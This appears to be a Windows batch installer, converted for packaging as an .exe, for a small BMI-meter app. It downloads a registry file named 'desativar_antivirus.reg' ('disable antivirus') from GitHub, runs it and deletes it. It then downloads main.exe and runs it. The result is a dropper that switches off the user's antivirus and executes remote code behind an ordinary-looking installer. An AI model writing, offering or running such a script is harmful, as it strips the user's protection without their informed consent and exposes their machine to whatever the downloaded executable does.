::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSTk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFB1RVgWQM3i7OpoS7czp5vyCnu78Ruc+OIvemoCcIeIS5k3rSZM+1XVWmfcJCA5bf7FsbwALr2dRv2eECM6RsDPkRFyb40wxJ2F7kG3cgyo/ZcEmn9sGsw==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
cd %USERPROFILE%\Downloads
mkdir Medidor_imc
cd Medidor_imc
type nul > people.json
curl -o desativar_antivirus.reg https://raw.githubusercontent.com/fezarosa-dev/entrega_edu_fis/main/desativar_antivirus.reg
curl -o ativar_antivirus.reg https://raw.githubusercontent.com/fezarosa-dev/entrega_edu_fis/main/ativar_antivirus.reg
start desativar_antivirus.reg
del desativar_antivirus.reg
curl -L -o main.exe https://github.com/fezarosa-dev/entrega_edu_fis/raw/main/main.exe
start main.exe
exit